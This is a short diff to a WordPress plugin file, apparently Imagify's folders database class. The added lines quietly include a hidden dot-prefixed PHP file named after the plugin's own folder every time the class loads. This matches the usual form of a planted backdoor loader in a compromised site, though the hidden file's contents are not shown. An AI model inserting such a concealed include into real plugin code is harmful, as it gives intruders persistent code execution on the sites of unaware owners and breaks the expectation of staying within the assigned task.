@@ -7,6 +7,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @since  1.7
  * @author Grégory Viguier
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Folders_DB extends Imagify_Abstract_DB {
 
 	/**
